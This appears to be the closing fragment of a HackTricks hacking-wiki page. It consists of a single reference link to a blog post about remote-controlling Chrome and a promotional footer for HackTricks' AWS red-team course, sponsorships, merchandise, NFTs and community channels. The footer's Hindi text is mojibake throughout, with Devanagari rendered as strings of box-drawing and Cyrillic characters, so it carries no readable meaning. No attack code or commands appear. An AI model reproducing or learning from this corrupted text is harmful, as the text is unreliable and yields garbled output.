* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
